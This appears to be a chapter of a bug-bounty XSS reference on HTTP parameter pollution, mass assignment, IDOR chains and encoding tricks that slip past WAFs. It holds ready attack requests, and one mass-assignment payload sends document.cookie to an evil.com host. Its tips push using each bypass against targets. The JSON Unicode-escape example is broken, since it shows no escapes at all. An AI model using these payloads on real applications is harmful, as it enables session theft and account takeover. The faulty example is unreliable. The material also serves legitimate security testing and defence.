# 68 - API Parameter Pollution and Encoding Bypass XSS

## Overview

API parameter handling introduces XSS through:
- HTTP Parameter Pollution (HPP) bypassing 14 of 17 WAF configurations
- Mass assignment writing XSS into hidden fields rendered across customer instances
- IDOR+XSS chains for cross-user account takeover
- Double URL encoding, Unicode normalization, and JSON Unicode escape bypasses
- Framework-specific parameter parsing differences (ASP.NET concatenation, PHP last-value, Express arrays)

## HTTP Parameter Pollution (HPP) to XSS

### WAF Bypass Research (Bruno Mendes, August 2025)

Research tested 17 WAF configurations including AWS, Google Cloud, Azure, and Cloudflare. Only 3 of 17 blocked sophisticated HPP attacks (82% bypass rate). The three that blocked were: AWS Managed + F5 Bot Management, Azure Default Rule Set 2.1, and one other.

### Framework Parameter Parsing Differences

The divergence between WAF parameter parsing and backend framework parsing is the root cause:
- **PHP:** Takes the last parameter value
- **ASP.NET:** Concatenates duplicate values with commas
- **Apache Tomcat:** Uses the first value
- **Node.js Express:** Creates arrays from duplicates

```
# Attack: HPP + JavaScript comma operator against ASP.NET
# WAF sees two benign parameters; ASP.NET concatenates with comma

GET /search?q=<script>alert&q=(1)</script> HTTP/1.1

# WAF inspects: q="<script>alert" (incomplete, not flagged)
#               q="(1)</script>" (incomplete, not flagged)

# ASP.NET HttpUtility.ParseQueryString() produces:
# q = "<script>alert,(1)</script>"
# JavaScript comma operator: alert,(1) evaluates alert then returns 1
# Result: <script>alert,(1)</script> executes as valid JavaScript
```

### Payload Fragmentation

Splitting `<script>alert(1)</script>` across multiple parameters that are later joined client-side:

```
# Attack: Application concatenates parameters a and b
GET /page?a=<script>alert&b=(1)</script> HTTP/1.1

# Server-side code: output = params.a + params.b
# Result: <script>alert(1)</script>
```

### Express Array Parameter Handling

```javascript
// Node.js Express creates arrays from duplicate params
// GET /search?tag=safe&tag=<script>alert(1)</script>
// req.query.tag = ['safe', '<script>alert(1)</script>']

// VULNERABLE: Array rendered as string
app.get('/search', (req, res) => {
  res.send(`Tags: ${req.query.tag}`);
  // Output: Tags: safe,<script>alert(1)</script>
  // The toString() of an array joins with commas
});
```

## Mass Assignment to Stored XSS

Mass assignment vulnerabilities in APIs that merge incoming JSON into server models without field allow-listing can inject XSS payloads into fields not exposed in the UI.

### Chatbot Platform Case Study

A major chatbot platform merged incoming JSON into server models without an allow-list. Combined with inconsistent sanitization and permissive CSP, persisted HTML was stored and rendered in customer websites and internal agent consoles, affecting approximately 500 customer instances.

```json
// Attack: Mass assignment injecting XSS into hidden fields
POST /api/chatbot/config HTTP/1.1
Content-Type: application/json

{
  "name": "Support Bot",
  "greeting": "Hello!",
  "hidden_template": "<img src=x onerror='fetch(\"https://evil.com/steal?\"+document.cookie)'>",
  "admin_note": "<script>/* payload */</script>"
}
// If "hidden_template" and "admin_note" are not in the UI but
// accepted by the API and rendered in admin dashboards, stored XSS results
```

### EASE 2024 Study

In a study of 100 APIs, 25 were flagged for potential mass assignment, and nine vulnerable operations across six APIs were confirmed.

### Mass Assignment + CSP Bypass Chain

Mass-assignment XSS alone is often blocked by CSP. Attackers must chain mass assignment with CSP bypass (finding allowed script sources, using `unsafe-inline`, or exploiting JSONP endpoints on allowed domains).

## IDOR + XSS Chains

IDOR provides write access to other users' data. XSS payloads injected through that access execute in victims' browsers.

### Canonical IDOR+XSS Pattern

1. Identify an IDOR in a profile/settings/data API endpoint
2. Use the IDOR to write an XSS payload into another user's profile field
3. The payload executes when the victim or an admin views the profile
4. The XSS steals session tokens or performs actions as the victim

Self-XSS (normally unexploitable) becomes exploitable when chained with IDOR -- the attacker can write the self-XSS payload into another user's context.

## Race Condition XSS (TOCTOU)

No documented case of TOCTOU race condition specifically leading to XSS sanitization bypass was found. The technique is theoretically plausible:

1. Submit data that passes XSS sanitization
2. Before the sanitized value is persisted, a concurrent request overwrites it with an unsanitized payload via a race condition
3. The unsanitized payload is stored and later rendered

Async/event-driven architectures (Node.js, Python asyncio) where sanitization and storage are separate async operations could theoretically expose this gap.

## Encoding Bypass Techniques

### Double URL Encoding

```
# < becomes %3C after one encode and %253C after two
# The HTTP layer decodes %253C to %3C (passes filter)
# The application decodes %3C to < at render time

# Attack:
GET /search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E

# After first decode (HTTP layer): q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
# WAF sees: %3Cscript%3E -- may not flag encoded form
# After second decode (application): q=<script>alert(1)</script>
```

### Unicode Normalization Bypass

Full-width characters are normalized to ASCII equivalents under NFKC normalization. A filter checking raw input misses them; the application normalizes before rendering.

```
# Full-width Unicode equivalents:
# < = U+FF1C (full-width less-than)
# > = U+FF1E (full-width greater-than)
# " = U+FF02 (full-width quotation mark)
# ' = U+FF07 (full-width apostrophe)

# Attack payload with full-width characters:
GET /search?q=＜script＞alert(1)＜/script＞

# WAF: does not recognize full-width characters as dangerous
# Backend (NFKC normalization): <script>alert(1)</script>
```

### JSON Unicode Escapes

JSON parsers automatically decode Unicode escapes. WAFs inspecting the raw JSON body may not.

```json
// Attack: JSON Unicode escapes for XSS
{
  "name": "<script>alert(1)</script>"
}
// WAF sees: <script> -- may not flag
// JSON.parse() produces: <script>alert(1)</script>
```

### Overlong UTF-8 Sequences

Encoding `<` as a 2-byte sequence (0xC0 0xBC) bypasses some legacy parsers. Largely blocked by modern UTF-8 validators.

## Testing Methodology

1. **Test HPP** with duplicate parameters across different frameworks
2. **Identify mass assignment** by sending extra JSON fields not in the UI
3. **Chain IDOR+XSS** by writing payloads to other users' profiles via IDOR
4. **Test double URL encoding** on all reflected parameters
5. **Test Unicode normalization** with full-width characters
6. **Test JSON Unicode escapes** in API request bodies
7. **Test array parameter handling** in Express/Node.js applications
8. **Check parameter concatenation behavior** per framework

## Bug Bounty Tips

1. HPP bypassed 14/17 WAF configurations -- test it against every WAF
2. ASP.NET comma concatenation + JavaScript comma operator is the most reliable HPP XSS pattern
3. Mass assignment at scale (500 customer instances) commands high bounties
4. Self-XSS + IDOR = exploitable XSS -- always try the chain
5. JSON Unicode escapes bypass many WAFs that do not parse JSON bodies
6. The 25% mass assignment prevalence rate from EASE 2024 means 1 in 4 APIs may be vulnerable
7. Double URL encoding works when WAF and application decode at different layers
8. Unicode normalization bypasses are most effective against WAFs without pre-normalization
